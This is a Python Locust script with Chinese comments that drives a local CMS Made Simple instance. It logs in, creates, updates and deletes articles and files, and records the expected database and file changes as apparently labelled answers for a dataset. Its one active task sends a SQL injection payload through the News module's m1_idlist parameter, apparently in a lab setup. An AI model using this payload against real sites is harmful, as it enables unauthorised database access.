from locust import HttpUser, task, between, events
from locust.clients import ResponseContextManager
import random
import string  
from loguru import logger  
import os
from itertools import count
import json
import gevent
import io
import re
import time
from playwright.sync_api import sync_playwright
from urllib.parse import unquote
from gevent.lock import Semaphore
from lxml import etree


data_dir = "/var/www/html/uploads/"

counter = count(0)  # 计数器，用于生成唯一的消息 ID
answer_file = os.path.join(os.path.dirname(__file__), "answers.json")  # 日志文件路径
answers = {}

file_choose_lock = Semaphore()  # 文件选择锁
selected_files = []
db_lock = Semaphore()


# CRSF_TOKEN = None
# COOKIES = None
# USER_AGENT = None
users = [
    {
        "username": "test",
        "password": "test",
        "id": 1
    },
]
users_crt = []

@events.test_start.add_listener
def on_test_start(environment, **_kwargs):
    def get_headers(url, username, password):  
        with sync_playwright() as p:  
            browser = p.chromium.launch()
            logger.info("Browser launched")
            page = browser.new_page()  
            
            try:  
                # 访问登录页  
                page.goto(f"{url}")  
                
                # 填写并提交登录表单  
                page.fill('input[name="username"]', username)  
                page.fill('input[name="password"]', password)  
                page.click('input[name="loginsubmit"]') 
                
                logger.info("Login form submitted")
                # 等待页面加载完成  
                page.wait_for_load_state('networkidle')  
                logger.info("Page loaded")
                
                cookies = page.context.cookies()
                useragent = page.evaluate("navigator.userAgent")
                
                return cookies, useragent
            finally:  
                browser.close()
    
    # CRSF_TOKEN, COOKIES, USER_AGENT = get_pgadmin_headers("http://localhost:5050", "vulhub@example.com", "vulhub")
    for user in users:
        crt = {}
        crt["COOKIES"], crt["USER_AGENT"] = get_headers("http://localhost:80/admin/login.php", user["username"], user["password"])
        users_crt.append(crt)
    input("Press Enter to Start the test...")  # 等待用户按下回车键


def calculate_bytes_sent(method: str, uri: str, request_headers: dict, body: str) -> int:
    """计算请求的字节数"""
    request_line = f"{method} {uri} HTTP/1.1\r\n"
    headers = "".join([f"{key}: {value}\r\n" for key, value in request_headers.items()])
    request = f"{request_line}{headers}\r\n{body}"
    return len(request)


def random_string(length: int = 15):  
    """生成随机字符串"""  
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))  


def new_log_entry(response: ResponseContextManager, extra: dict | None = None) -> dict:
    """创建新的日志条目""" 
    # print(str(response.request.body) if response.request.body else "")
    # print(response.request.headers)
    try:
        body = json.loads(str(response.request.body)) if response.request.body else {} 
        body = {k: str(v) for k, v in body.items()}  # 将所有值转换为字符串
    except json.JSONDecodeError:
        boundary_match = re.search(r'boundary=(.+?)', response.request.headers.get('Content-Type', ''))
        body = {}
        if boundary_match:
            boundary = boundary_match.group(1)
            # print("boundary:", boundary)
            parts = response.request.body.decode("utf-8").split('--' + boundary)
            for part in parts:
                if 'Content-Disposition' in part:
                    # 提取 name
                    name_match = re.search(r'name="([^"]+)"', part)
                    if name_match:
                        name = name_match.group(1)
                        # print("name:", name)
                        if name == 'm1_files[]':
                            # 提取 filename
                            filename_match = re.search(r'filename="([^"]+)"', part)
                            if filename_match:
                                body['filename'] = filename_match.group(1)
                        else:
                            # 提取对应的值
                            # print(repr(part.split(name)[1]))
                            value_match = re.search(r'\r\n\r\n(.*?)\r\n', part.split(name)[1], re.DOTALL)
                            if value_match:
                                value = value_match.group(1).strip()
                                body[name] = value

    if response.request.headers.get("Content-Type") == "application/x-www-form-urlencoded":
        # 如果是表单提交，解析表单数据
        body = {unquote(k): unquote(v) for k, v in (item.split('=') for item in str(response.request.body).split('&'))}

    if extra:
        for key, value in extra.items():
            body[key] = str(value)  # 将所有值转换为字符串
    if '?' in response.request_meta["name"]:
        query_string = response.request_meta["name"].split('?')[1]
        query_params = query_string.split('&')
        for param in query_params:
            key, value = param.split('=')
            # 对key和value进行URL解码
            key = unquote(key)
            value = unquote(value)
            body[key] = value
    return {
        "verb": response.request_meta["request_type"],
        "uri": response.request_meta["name"],
        "bytes_sent": calculate_bytes_sent(
            response.request_meta["request_type"],
            response.request_meta["name"],
            response.request.headers,
            str(response.request.body) if response.request.body else "",
        ),
        "num_params": len(body),
        "params": body,
    }


class APIUser(HttpUser):  
    """定义用户行为"""  
    wait_time = between(2, 4)  # 每次请求之间的等待时间（1到3秒之间随机）
    trans_id = None  # 初始化事务 ID
    user_index = 0  # 用户索引
        
    def on_start(self):
        try:
            # 登陆获取Session
            self.user_index = random.randint(0, len(users_crt) - 1)
            COOKIES = users_crt[self.user_index]["COOKIES"]
            USER_AGENT = users_crt[self.user_index]["USER_AGENT"]

            if all([COOKIES, USER_AGENT]):
                self.client.headers["Cookie"] = "; ".join([f"{cookie['name']}={cookie['value']}" for cookie in COOKIES])
                self.client.headers["User-Agent"] = USER_AGENT
                self.trans_id = [cookie['value'] for cookie in COOKIES if cookie['name'] == "__c"][0]
            else:
                logger.error("Failed to obtain cookies, or user agent.")
                raise Exception("Failed to obtain cookies, or user agent.")
            self.client.headers["Host"] = "localhost:80"
            self.client.headers["Origin"] = "http://localhost:80"

        except KeyboardInterrupt:
            logger.info("Test interrupted by user")
            raise
        except gevent.Timeout:
            logger.error("Timeout occurred")
            raise
        except Exception as e:
            gevent.sleep(1)
            self.on_start()
    
    # @task
    def new_article(self, article_id=0):
        """创建新文章"""
        # 生成随机数据
        title = random_string(10)
        content = random_string(100)
        alias = random_string(5)

        x_request_id = str(next(counter))
        with self.client.post(
            f"/admin/moduleinterface.php",
            headers={
                "x_request_id": x_request_id,
            },
            params={
                "create" if article_id == 0 else "update": "",
            },
            files={
                'mact': (None, 'CMSContentManager,m1_,admin_editcontent,0'),
                '__c': (None, self.trans_id),
                'm1_content_id': (None, f"{article_id}"),
                'm1_submit': (None, 'Submit'),
                'm1_content_type': (None, 'content'),
                'title': (None, title),
                'content_en': (None, f"<p>{content}</p>"),
                'target': (None, '---'),
                'template_id': (None, '10'),
                'alias': (None, alias),
                'ownerid': (None, '1'),
            },
            catch_response=True,
            allow_redirects=False,
        ) as response:
            # 处理响应
            if response.status_code == 302:
                # 解析响应
                response.success()
                entry = new_log_entry(response)
                db_statements = []
                if article_id == 0:
                    db_statements = [
                        {
                            "type": "INSERT",
                            "table": "cms_content",
                            "columns": {
                                "content_id": "*",
                                "content_name": title,
                                "content_alias": alias,
                                "type": "content",
                                "owner_id": "1",
                                "parent_id": "-1",
                                "template_id": "10",
                                "active": "1",
                                "menu_text": title,
                                "last_modified_by": "1",
                            },
                            "is_match": True
                        },
                        {
                            "type": "INSERT",
                            "table": "cms_content_props",
                            "columns": {
                                "content_id": "*",
                                "type": "string",
                                "prop_name": "content_en",
                                "content": f"<p>{content}</p>",
                            },
                            "is_match": True
                        },
                        {
                            "type": "INSERT",
                            "table": "cms_adminlog",
                            "columns": {
                                "user_id": "1",
                                "username": "test",
                                "item_id": "*",
                                "item_name": f"Content Item: {title}",
                                "action": " Edited",
                                "ip_addr": "NULL"
                            },
                            "is_match": True
                        },
                    ]
                else:
                    db_statements = [
                        {
                            "type": "UPDATE",
                            "table": "cms_content",
                            "columns": {
                                "content_name": title,
                                "owner_id": "1",
                                "type": "content",
                                "template_id": "10",
                                "parent_id": "-1",
                                "active": "1",
                                "show_in_menu": "1",
                                "menu_text": title,
                                "content_alias": alias,
                                "content_id": str(article_id)
                            },
                            "is_match": True
                        },
                        {
                            "type": "UPDATE",
                            "table": "cms_content_props",
                            "columns": {
                                "content": f"<p>{content}</p>",
                                "content_id": str(article_id),
                                "prop_name": "content_en"
                            },
                            "is_match": True
                        },
                        {
                            "type": "INSERT",
                            "table": "cms_adminlog",
                            "columns": {
                                "user_id": "1",
                                "username": "test",
                                "item_id": str(article_id),
                                "item_name": f"Content Item: {title}",
                                "action": " Edited",
                                "ip_addr": "NULL"
                            },
                            "is_match": True
                        },
                    ]        
                answers[str(x_request_id)] = {
                    "http_request": entry,
                    "db_statements": db_statements,
                    "request_time": time.time(),
                }
            else:
                logger.error(f"{'new' if article_id == 0 else 'update'} article failed with status code: {response.status_code}")
                response.failure(f"Request failed with status code: {response.status_code}")

    def get_all_articles(self):
        """获取所有文章"""
        # x_request_id = str(next(counter))
        with self.client.get(
            "/admin/moduleinterface.php",
            params={
                "mact": "CMSContentManager,m1_,ajax_get_content,0",
                "__c": self.trans_id,
            },
            catch_response=True,
            allow_redirects=True,
        ) as response:
            # 处理响应
            article_ids = []
            if response.status_code == 200:
                id_matches = re.findall(r'tr id="row_(\d+)"', response.text)
                if id_matches:
                    for id_match in id_matches:
                        article_ids.append(id_match)
            else:
                logger.error(f"Request failed with status code: {response.status_code}")
                response.failure(f"Request failed with status code: {response.status_code}")
            # 返回所有文章的 ID
            return article_ids

    # @task
    def delete_article(self):
        """删除文章"""
        # 获取所有文章的 ID
        with db_lock:
            article_ids = self.get_all_articles()
            if article_ids:
                # 随机选择一个 ID
                article_id = random.choice(article_ids)
                # 确保选择的 ID 大于 35
                while int(article_id) < 35:
                    article_id = random.choice(article_ids)
                x_request_id = str(next(counter))
                with self.client.post(
                    "/admin/moduleinterface.php",
                    params={
                        "mact": "CMSContentManager,m1_,defaultadmin,0",
                        "__c": self.trans_id,
                        "m1_delete": article_id,
                        "showtemplate": "false",
                        "m1_ajax": "1",
                    },
                    headers={
                        "x_request_id": x_request_id,
                    },
                    catch_response=True,
                    allow_redirects=False,
                ) as response:
                    # 处理响应
                    if response.status_code == 200:
                        logger.info(f"Article {article_id} delete successfully")
                        response.success()
                        entry = new_log_entry(response)
                        db_statements=[
                            {
                                "type": "DELETE",
                                "table": "cms_content",
                                "columns": {
                                    "content_id": str(article_id)
                                },
                                "is_match": True
                            },
                            {
                                "type": "INSERT",
                                "table": "cms_adminlog",
                                "columns": {
                                    "user_id": "1",
                                    "username": "test",
                                    "item_id": str(article_id),
                                    "item_name": "Core",
                                    "action": "Deleted content page",
                                    "ip_addr": "NULL"
                                },
                                "is_match": True
                            },
                        ]
                        answers[str(x_request_id)] = {
                            "http_request": entry,
                            "db_statements": db_statements,
                            "request_time": time.time(),
                        }
                    else:
                        logger.error(f"delete article {article_id} failed with status code: {response.status_code}")
                        response.failure(f"Request failed with status code: {response.status_code}")

    # @task
    def update_article(self):
        """更新文章"""
        # 获取所有文章的 ID
        with db_lock:
            article_ids = self.get_all_articles()
            if article_ids:
                # 随机选择一个 ID
                article_id = random.choice(article_ids)
                self.new_article(article_id)
                logger.info(f"Article {article_id} updated successfully")
        
    # @task
    def get_all_files(self):
        """获取所有文件"""
        x_request_id = str(next(counter))
        with self.client.get(
            "/admin/moduleinterface.php",
            params={
                "mact": "FileManager,m1_,defaultadmin,0",
                "__c": self.trans_id,
            },
            headers={
                "x_request_id": x_request_id,
            },
            catch_response=True,
            allow_redirects=True,
        ) as response:
            # 处理响应
            files = []
            if response.status_code == 200:
                id_matches = re.findall(
                    r"<td class=\"clickable\"[^>]*>\s*<a class=\"filelink\"[^>]*>(.*?)</a>.*?id=\"x_(.*?)\"",
                    response.text,
                    re.DOTALL
                )
                if id_matches:
                    for id_match in id_matches:
                        if not id_match[0].endswith(".txt"):
                            continue
                        files.append(id_match)

            else:
                logger.error(f"Request failed with status code: {response.status_code}")
                response.failure(f"Request failed with status code: {response.status_code}")
            # 返回所有文件的 ID
            # logger.info(f"Found {(files)}")
            return files
    
    # @task
    def upload_file(self):
        """上传文件"""
        file_content = random_string(100)
        file_name = random_string(10) + ".txt"
        file_content = io.StringIO(file_content)
        x_request_id = str(next(counter))
        with self.client.post(
            "/admin/moduleinterface.php?upload=",
            headers={
                "x_request_id": x_request_id,
            },
            files={
                "m1_files[]": (file_name, file_content, "text/plain"),
                "mact": (None, "FileManager,m1_,upload,0"),
                "__c": (None, self.trans_id),
                "disable_buuufer": (None, "1"),
            },
            catch_response=True,
            allow_redirects=False,
        ) as response:
            # 处理响应
            if response.status_code == 200:
                # 解析响应
                entry = new_log_entry(response)
                fs_operations = [
                    {
                        "operation": "create",
                        "source_path": f"{data_dir}{file_name}",
                        "destination_path": None,
                        "is_directory": False
                    },
                    {
                        "operation": "update",
                        "source_path": f"{data_dir}{file_name}",
                        "destination_path": None,
                        "is_directory": False
                    },
                ]
                answers[str(x_request_id)] = {
                    "http_request": entry,
                    "fs_operations": fs_operations,
                    "request_time": time.time(),
                }
                response.success()
            else:
                print(response.text)
                print(response.request.body)
                logger.error(f"Upload file failed with status code: {response.status_code}")
                response.failure(f"Request failed with status code: {response.status_code}")

    # @task
    def delete_file(self):
        """删除文件"""
        # 获取所有文件的 ID
        file_ids = self.get_all_files()
        gevent.sleep(2)
        if file_ids:
            # 随机选择一个 ID
            with file_choose_lock:
                candidate_files = [f for f in file_ids if f[0] not in selected_files]
                if not candidate_files:
                    logger.info("No more files to delete, all files have been selected.")
                    return
                file_name, file_id = random.choice(candidate_files)
                selected_files.append(file_name)  # 添加到已选择的文件列表
                # file_name, file_id = random.choice(file_ids)
            x_request_id = str(next(counter))
            with self.client.post(
                "/admin/moduleinterface.php?delete=",
                data={
                    "mact": "FileManager,m1_,fileaction,0",
                    "__c": self.trans_id,
                    "m1_fileactiondelete": "",
                    "m1_path": "/uploads",
                    "m1_selall": "a:1:{i:0;s:length:\"id\";}".replace("length", str(len(file_id))).replace("id", file_id),
                    "m1_submit": "Delete",
                },
                headers={
                    "x_request_id": x_request_id,
                },
                catch_response=True,
                allow_redirects=False,
            ) as response:
                # 处理响应
                if response.status_code == 302:
                    # 解析响应
                    entry = new_log_entry(response)
                    fs_operations = [
                        {
                            "operation": "delete",
                            "source_path": f"{data_dir}{file_name}",
                            "destination_path": None,
                            "is_directory": False
                        }
                    ]
                    answers[str(x_request_id)] = {
                        "http_request": entry,
                        "fs_operations": fs_operations,
                        "request_time": time.time(),
                    }
                    logger.info(f"File {file_name} deleted successfully")
                    response.success()
                else:
                    logger.error(f"Delete file {file_id} failed with status code: {response.status_code}")
                    response.failure(f"Request failed with status code: {response.status_code}")

    @task
    def attack(self):
        x_request_id = str(next(counter))
        exp = "select * from cms_content"
        payload = {
            "mact" : "News,m1_,default,0",
            "m1_idlist": "0,1,2)) and (%s) -- " % exp
        }
        with self.client.get(
            "/moduleinterface.php",
            headers={
                "x_request_id": x_request_id
            },
            params=payload,
            catch_response=True
        ) as response:
            logger.info(response.text)
            if response.status_code == 200:
                # 解析响应
                entry = new_log_entry(response)
                # answers[str(x_request_id)] = {
                #     "http_request": entry,
                #     "fs_operations": fs_operations,
                #     "request_time": time.time(),
                # }
                response.success()
            else:
                response.failure(f"Request failed with status code: {response.status_code}")


@events.test_stop.add_listener
def on_test_stop(environment, **_kwargs):
    # 将答案写入文件
    with open(answer_file, "w") as f:
        json.dump(answers, f, indent=4)
    logger.info(f"Answers written to {answer_file}")
